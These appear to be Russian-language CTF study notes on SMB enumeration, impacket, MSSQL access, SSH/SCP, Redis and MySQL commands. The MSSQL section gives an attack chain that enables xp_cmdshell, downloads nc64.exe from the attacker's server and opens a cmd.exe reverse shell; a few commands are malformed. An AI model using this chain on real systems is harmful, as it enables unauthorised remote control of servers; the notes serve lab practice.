## Введение 

> [[#SMB|1. SMB]]

## SMB
Протокол удалённого подключения к файловой системе и её управления на Windows. В рамка CTF и работы с уязвимостями на Linux используется утилита `smbmap`
### SMBMAP / SMBGET / SMBCLIENT
Допустим на хосте 10.10.1.2 на порту 139/tcp и 445/tcp работает SERVICE `netbios-ssn` VERSION `Samba smbd 3.x-4.x`:
1. `smbmap -H 10.10.1.2` - узнать подробнее о службе
2. ```
smbclient -N -L \\\\{TARGET_IP}\\ 
-N : No password 
-L : просмотр служб, которые есть на сервере

 3. чтобы войти к какую-то службу от корневой 
	 ```
	smbclient -N \\\\{TARGET_IP}\\<some share>
	```
4. `smbget -R smb://10.10.1.2/<Disk>` - скачать доступный ресурс рекурсивно
### impacket
Impacket представляет собой коллекцию классов Python для работы с сетевыми протоколами. Impacket ориентирован на обеспечение низкоуровневого программного доступа к пакетам, а для некоторых протоколов (например, SMB1-3 и MSRPC) — на саму реализацию протокола. Пакеты могут быть сконструированы с нуля, а также разобраны из необработанных данных, а объектно-ориентированный API упрощает работу с глубокими иерархиями протоколов. Библиотека предоставляет набор инструментов в качестве примеров того, что можно сделать в контексте этой библиотеки.
```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt
```
Теперь мы готовы узнать об использовании инструмента и, в частности, mssqlclient.py скрипта.
```
cd impacket/examples/
python3 mssqlclient.py -h
```
Пример подключения к **MSSQL**:
```
python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```
где `-windows-auth` - флаг указан для использования проверки подлинности Windows
Для взлома MSSQL полезен ресурс: [MSSQL Injection Cheat Sheet | pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
Например благодаря нему можно использовать следующие команды для получения доступа к windows машине:
``` 
EXEC xp_cmdshell 'net user';
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

У себя:
python -m http.server 80
nc -lvnc 443

Снова в MSSQL:
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<my python IP>/nc64.exe -outfile nc64.exe"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe <my nc IP> 443"
```
Пример подключения к машине windows (из соответствующей папки impacket):
```
python3 psexec.py <login>@{TARGET_IP}
```
## SSH
чтобы подключиться:
``` 
ssh <login>:<ip adress> -p <port>
```
подключиться без пароля по ssh ключу:
```
ssh -i <key_file> <login>:<ip adress>
```
#### SCP
Позволяет передать файл на удалённый сервер или скачать его с удалённого сервера.
Пример передачи в папку /tmp:
```
scp <file> <ssh_login>@<IP>:/tmp
```
Пример скачивания файла:
``` 
scp <ssh_login>@<IP>:<path_to_file> .
```
## REDIS
in-memory database. Для взаимодействия используется утилита `redis-cli`
пример:
```bush
redis-cli -h <hostname> #подключение к хосту

info # получить информацию находясь на хосте

SELECT <> # выбрать данные, например SELECT 0 - узнать ключи под индексом 0

keys * # узнать, какие ключи есть в БД

get <key> # получить значение ключа <key>

```
## mysql
```
mysql -u <username> -h <host> -p <password>
```
